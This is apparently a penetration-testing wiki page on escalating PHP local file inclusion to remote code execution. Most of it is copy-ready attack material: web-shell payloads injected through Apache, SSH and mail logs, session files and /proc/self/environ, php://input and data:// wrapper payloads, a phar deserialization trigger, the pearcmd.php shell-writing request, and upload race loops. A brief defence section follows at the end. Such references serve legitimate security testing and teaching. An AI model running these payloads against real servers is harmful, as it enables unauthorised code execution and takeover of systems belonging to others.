---
title: LFI to RCE escalation chains
slug: lfi-to-rce-chains
aliases: [LFI to RCE, local file inclusion RCE, log poisoning, PHP wrappers RCE]
---

> **TL;DR:** A Local File Inclusion alone reads files — but chained with log poisoning, PHP wrappers, session files, `/proc` tricks, or upload races, it becomes full RCE. Master the chain for each vector because the LFI sink is common but the RCE path depends on the environment.

## What it is
LFI lets an attacker control a file path passed to an include/require/fopen function. By itself, it reads local files (source code, `/etc/passwd`, config files with credentials). The jump to RCE requires getting attacker-controlled PHP/code into a file the LFI can include. Each chain has specific preconditions and reliability characteristics.

## Preconditions / where it applies
- PHP `include`, `include_once`, `require`, `require_once` with user-controlled path
- Sometimes `file_get_contents`, `fopen`, `readfile` (read-only, but still useful for wrapper abuse)
- The target runs PHP (most chains are PHP-specific; some concepts apply to JSP, Python `exec`/`eval`)

## Technique

### 1 — Log poisoning (Apache / Nginx)
Inject PHP into a log file, then include it:

```bash
# Apache access log — inject via User-Agent
curl -A '<?php system($_GET["c"]); ?>' http://target.com/

# Then include the log
http://target.com/vuln.php?page=/var/log/apache2/access.log&c=id
# Common paths: /var/log/apache2/access.log, /var/log/httpd/access_log,
#               /var/log/nginx/access.log, /var/log/apache2/error.log
```

```bash
# SSH auth log — inject via username
ssh '<?php system($_GET["c"]); ?>'@target.com

# Include
http://target.com/vuln.php?page=/var/log/auth.log&c=id
```

```bash
# Mail log — inject via SMTP RCPT TO
telnet target.com 25
MAIL FROM:<attacker@evil.com>
RCPT TO:<?php system($_GET['c']); ?>

# Include /var/log/mail.log
```

Caveat: log poisoning fails if logs are rotated, permissions block `www-data` read, or PHP errors on the large log file. One-shot — if the log parse breaks, you may need to wait for rotation.

### 2 — PHP session files
PHP stores sessions in files named `sess_<PHPSESSID>`. If you can inject PHP into a session variable:

```bash
# set a session variable to PHP code via normal app functionality
# e.g., a "username" field stored in session
curl -b 'PHPSESSID=abc123' 'http://target.com/login' -d 'user=<?php system($_GET["c"]); ?>'

# include the session file
http://target.com/vuln.php?page=/var/lib/php/sessions/sess_abc123&c=id
# Also try: /tmp/sess_*, /var/lib/php5/sessions/, /var/lib/php/sess_*
```

### 3 — `/proc/self/environ`
On Linux, `/proc/self/environ` contains environment variables of the current process, including `HTTP_USER_AGENT`:

```bash
curl -A '<?php system($_GET["c"]); ?>' \
  'http://target.com/vuln.php?page=/proc/self/environ&c=id'
```

Requires: `/proc/self/environ` readable by `www-data` (often restricted on modern distros).

### 4 — `/proc/self/fd/N` (file descriptor brute-force)
Open file descriptors include log files, temp files, and stdin:

```bash
# brute-force FD numbers
for fd in $(seq 0 30); do
  curl "http://target.com/vuln.php?page=/proc/self/fd/$fd"
done
```

If Apache logs or error streams are among the FDs, combine with log poisoning.

### 5 — PHP wrappers

**`php://filter`** — read source code (no RCE alone, but leaks secrets/logic):
```
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=index.php
```

**`php://input`** — include POST body as PHP:
```bash
curl -X POST 'http://target.com/vuln.php?page=php://input' \
  -d '<?php system("id"); ?>'
```
Requires: `allow_url_include=On`.

**`data://`** — inline PHP payload:
```
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```
Requires: `allow_url_include=On`.

**`expect://`** — execute OS command directly:
```
expect://id
```
Requires: PECL `expect` extension (rare but check).

**`phar://`** — trigger deserialization via phar metadata:
```bash
# create malicious phar
php -r '$p=new Phar("evil.phar");$p["x"]="test";$p->setMetadata(new GADGET_CLASS());$p->stopBuffering();'
# upload evil.phar (or evil.jpg containing phar)
# trigger: phar://uploads/evil.jpg/x
```
See [[php-deserialization]] for gadget chains.

### 6 — PEARCMD.php trick
If `register_argc_argv=On` (default in many PHP-FPM configs) and PEAR is installed:

```
http://target.com/vuln.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET['c']);?>+/tmp/shell.php
# Then include /tmp/shell.php
```

Works without `allow_url_include`. One of the most reliable modern LFI-to-RCE chains.

### 7 — Upload + include race condition
If the app allows file upload (even with validation):

```bash
# upload a PHP file disguised as an image; even if the app deletes/rejects it,
# there's a race window where the temp file exists
# PHP stores uploads in /tmp/php[a-zA-Z0-9]{6}

# race script — flood upload + include simultaneously
while true; do
  curl -F "file=@shell.php" http://target.com/upload &
  curl "http://target.com/vuln.php?page=/tmp/phpXXXXXX" &
done
```

### 8 — `phpinfo()` + temp file (reliable race)
If a `phpinfo()` page exists, upload a file to it — `phpinfo()` prints the temp file path in `$_FILES`. Race between reading the path from `phpinfo()` output and including the temp file before PHP deletes it:

```bash
# LFIhack tool or custom script:
# 1. POST multipart with PHP payload to phpinfo.php
# 2. Parse response for tmp_name (/tmp/phpXXXXXX)
# 3. Immediately request vuln.php?page=/tmp/phpXXXXXX
```

Tool: `lfisuite`, `phpinfo_lfi_exploit.py` from [insomnia](https://github.com/insomnia-security).

### 9 — Null byte truncation (legacy)
PHP < 5.3.4 allows null byte to truncate appended extensions:

```
vuln.php?page=../../../etc/passwd%00
# bypasses: include($_GET['page'] . '.php')
```

See [[regex-filter-bypass-patterns]] for null byte details.

## Detection and defence
- Never pass user input to `include`/`require` — use a lookup table mapping allowed keys to file paths
- `allow_url_include=Off` and `allow_url_fopen=Off` (block `php://input`, `data://`, remote includes)
- `open_basedir` restriction limits which directories PHP can access
- Log files: restrict read permissions so `www-data` cannot read them
- Remove `phpinfo()` pages from production
- Monitor for `/proc/self`, `php://`, `data://`, `phar://` in request parameters (WAF rules)

See also [[path-traversal]], [[php-deserialization]], [[regex-filter-bypass-patterns]], [[file-upload-attacks]].

## References
- [HackTricks — LFI to RCE](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html) — comprehensive chain catalogue
- [PayloadsAllTheThings — File inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) — wrapper + poisoning payloads
- [PEARCMD trick](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) — original write-up
- [PortSwigger — File path traversal](https://portswigger.net/web-security/file-path-traversal) — related concepts
